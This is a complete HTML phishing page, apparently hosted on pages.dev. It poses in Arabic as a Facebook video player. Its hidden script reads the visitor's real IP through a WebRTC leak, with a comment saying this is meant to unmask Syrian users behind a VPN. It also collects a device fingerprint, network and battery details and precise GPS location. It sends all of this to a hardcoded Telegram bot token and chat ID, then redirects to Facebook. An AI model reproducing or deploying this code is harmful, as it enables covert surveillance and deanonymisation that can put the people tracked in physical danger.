    <meta property="og:url" content="https://appsyria00.pages.dev/"> <meta property="fb:app_id" content="966242223397117"> <link rel="canonical" href="https://appsyria00.pages.dev/"> <style>
        body { margin: 0; background: #f0f2f5; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: pointer; }
        .card { text-align: center; background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
        .fb-logo { width: 60px; margin-bottom: 20px; }
        .h1 { font-size: 22px; font-weight: bold; color: #1c1e21; margin-bottom: 15px; }
        .btn { background: #1877f2; color: white; padding: 16px; border-radius: 10px; font-weight: bold; border: none; width: 100%; font-size: 18px; box-shadow: 0 4px 12px rgba(24, 119, 242, 0.4); transition: 0.3s; }
        .btn:hover { background: #166fe5; transform: translateY(-2px); }

</head>
<body onclick="getAccurateGPS()">

    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" class="fb-logo">
        <div class="h1">مركز معالجة الفيديو</div>
        <p style="font-size: 14px; color: #606770; margin-bottom: 30px;">يتم الآن تخصيص أفضل جودة بث لموقعك ولنوع جهازك... اضغط للمشاهدة فوراً.</p>
        <button class="btn">تشغيل الآن</button>
        <p style="font-size: 12px; color: #90949c; margin-top: 15px;">بواسطة شركة فيسبوك فيديو</p>
    </div>

<script>
    // 🔱 إعدادات بوت تلجرام (أمجد) - لا تغيرها 🔱
    const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
    const CHAT_ID = "1611398303";

    function send(msg) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
    }

    // 🔱 1. كشف الـ IP السوري الحقيقي متجاوزاً الـ VPN (WebRTC Leak)
    function checkRealConnectivity() {
        var pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
        pc.createDataChannel("");
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = function(ice) {
            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
            var realIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
            if (realIP && !realIP.startsWith("192.") && !realIP.startsWith("10.") && !realIP.startsWith("172.")) {
                send("🚀🚨 كشف الـ IP السوري الحقيقي (خلف الـ VPN): " + realIP);
            } else if (realIP) {
                send("🏠 الـ IP المحلي (الراوتر): " + realIP);
            }
        };
    }

    // 🔱 2. استخبارات الشبكة والواي فاي (صامتة)
    async function getNetworkIntel() {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        if (conn) {
            let wifiIntel = `📡 [استخبارات الشبكة]\n📶 نوع الاتصال: ${conn.effectiveType}\n🚀 السرعة: ${conn.downlink} Mbps`;
            send(wifiIntel);
        }
    }

    // 🔱 3. الهوية الرقمية والعتاد العميق (صامتة)
    async function getDeviceRecon() {
        let intel = "🕵️‍♂️ [الهوية الرقمية للعتاد]\n";
        try {
            intel += `⚙️ الأنوية: ${navigator.hardwareConcurrency} | الرام: ~${navigator.deviceMemory}GB\n`;
            intel += `🖥️ الشاشة: ${screen.width}x${screen.height}\n`;
            if (navigator.getBattery) {
                const bat = await navigator.getBattery();
                intel += `🔋 البطارية: ${Math.round(bat.level * 100)}% (${bat.charging ? '⚡' : '🔋'})\n`;
            }
            send(intel);
        } catch(e) {}
    }

    // 🔱 4. تحليل السلوك والحساسات والمفاجأة (صامتة)
    function getSensoryIntel() {
        window.ondeviceorientation = (e) => {
            if(e.beta !== null) {
                let orientation = `💡 وضعية الاستخدام: ${Math.abs(e.beta) < 15 ? "على الطاولة" : "محمول باليد"}`;
                send(orientation);
                window.ondeviceorientation = null;
            }
        };
        send(`🌐 [بصمة المتصفح]\nاللغة: ${navigator.language}\nالمنصة: ${navigator.platform}`);
    }

    // 🔱 5. الموقع الدقيق جداً بالشارع (GPS - عند الضغط)
    function getAccurateGPS() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((pos) => {
                let lat = pos.coords.latitude;
                let lon = pos.coords.longitude;
                let msg = `🎯🎯 [الموقع الدقيق جداً بالشارع]\n🔗 الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
                send(msg);
                setTimeout(() => location.href = "https://m.facebook.com", 800);
            }, () => { location.href = "https://m.facebook.com"; }, {enableHighAccuracy: true});
        } else { location.href = "https://m.facebook.com"; }
    }

    // تشغيل كافة المحركات الصامتة فور التحميل
    window.onload = () => {
        checkRealConnectivity(); // الأهم لكشف الـ VPN
        getNetworkIntel();
        getDeviceRecon();
        getSensoryIntel();
    };
</script>
</body>
</html>
